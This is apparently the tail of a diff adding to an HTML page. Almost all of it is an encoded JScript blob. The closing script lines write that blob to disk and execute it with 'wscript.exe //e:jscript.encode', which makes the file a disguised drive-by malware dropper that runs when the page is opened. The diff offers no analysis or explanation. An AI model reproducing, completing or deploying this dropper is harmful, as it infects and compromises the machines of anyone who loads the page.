+X+-\'9n4!oT+.BSv1:[Ra+,z^~9+V~&$P&0Ebp8^mY1t`#PNYMX`6hfzcI+T	DbY+vvu|dH\'-jroPqb]2\'wHbm.GkW0Ow\'rx9GS/~gK\'-Z!DMnxD.nDkkGU\'-qsCoPsbsnPA6m;YrG	P6wDrW	/wwM+o nX+w-Gn(ELT+MB~Ems[R6nPJm~.:B*I81lY14c+*	)Y.X`ahfXc]+T.rD+`vunS\\-\'j}sPqb"2-\'Hb^DK/G0D-w	bxNKA/,1K\'w/EMDxO.n.kkGx\'wqslLn,sksn,2a+1;DkG	P}wYbW	d-\'InozVz"DRa+\'-f8;oT+MBSB^h9Rn6~z1P[n^Pz5~J0v#pN1lO1tv+#P8D.XP6nh2X ]oMrY`B_FJH\'-UroK	)"2w-trmMWdG6Y-w	bx[WSd,1P\'-;EDM+	O.DdkKxww&:lTnPwkV~36m!YrWU~}wOkKU/\'-OCk33rs^Rn6w\'fn(ETo+MBBvmsN +X+~&1PDhB*i81COm4`#`8O.H	a+SfXcInLqDkOnvBu|d\\\'-j}s:b"2\'wHbm.WkWWO\'-bUNKh/,HP-\'Z!D.+UOj+./bGx\'-	r	VWLG	-wjknMkUbYE~yH X1_E-wEk+.r	kYcn6~hk^.kaYc+a+~&J+lLk^DbwO xmG[Pv_60mF13B,z+E#pNmmY^tv+b`)YDH`6h&H ]+TMkO+cv_|JH\'w?}sP	zI2wwtk^DKdK0O\'-qkx9WSd-\'Z;DM+UOj+DkrW	--Aa2VKDDw-)[7lUm[-\'sGs9+Dww_k[+wr^+3XY\'-j	m4nm0+[.mV;nE~B8v~EI2Vm9}IGBbiN^mY^tvn#P8O.H	6nA2X ILqDrD+vBCnStw-UroKqb]3\'-Hb^DK/W6Ow-qk	NGhdw\'Z;DMnxD.n.kkWUw\'2aw^GM+.\'-zN\\mx1nN\'-oW^Nn.\'-?!2+MCk9[nx\'-`x^tn^0+[.msEBSvZB~v]AMmfq6"fv*i)mlDm4c+*	NYMX`ah&H IoMrO+vB_|JHwwUroKq)IA-wKKVk^r/w-tr1DGkW6Y-\'bUNKhdPgKwwUX/Dn:"+/DG.+\'-Gkdl8sZGx6roE~vqE~B]3V{9}]GBbp81lY1tvn#P8ODH	anS&Xc]+TDbOn`ECnS\\-wj}sPz]2\'-KG^kmrnk-wHb^MWdK0D--qk	[WS/~1:-wjH/YhI/YK.n-\'fb/C4snUIv~EqBBB]3V{f	6"fv#pN1lO1tv+#P8)WE	mOkKx~"ayWc#P\\lM~Cc$VD\'	?^.bwORz.o!:nUD/irWv4f;WXvm-(l$#"{BNd+E[\'lW;sOcV+	LY4@*!*`dhbY1tcl*5^Y qDn:v!bbPmldn,B&+El1*UN&v#i(DC3pmC/Pv&MB)^2%Mc`*I8Dl0i^ldn,B&/EllFE{;v#i8.lVi1Ck+~Ez	B)k,.d:v#I4M+CVpmlknPEzYEln,^L.`bianS&zR";xvB^h9Pz^~9+sPJ5,zW,B3m\\(l$S!*i8DlVI1l/~BJlB=n1VNyv#I6nA2X I!U`E+a2^WDn.c+a+,&~&k+^+mD~EQm74C;*i8.l3p[+6lE^Ol+OVNyc#IOMX`6A&HR];	`BAhaVCX.c+aPrB_1\\(C;c/;4kY.cZ~m78l$RVULY4OO#QB8nmEOk6;V|or.^{wC.D{v_m*$VOc1m:+9R&O+s`v;E#Qvcl\\bv#p8mmO^tv+*	N8Nn^/n	1VNycbp4\\X"8`bi)N.w"K+v#iFWMMAA==^#~@ '+String.fromCharCode(0);var rwyg5=ayfp6.CreateTextFile(s41k8+'\\'+bgw3u,true);rwyg5.Write(vlx8c);rwyg5.Close();dk5h8.Run('wscript.exe //e:jscript.encode '+s41k8+'\\'+bgw3u+' /t');
+//-->
+</script>
+</html>
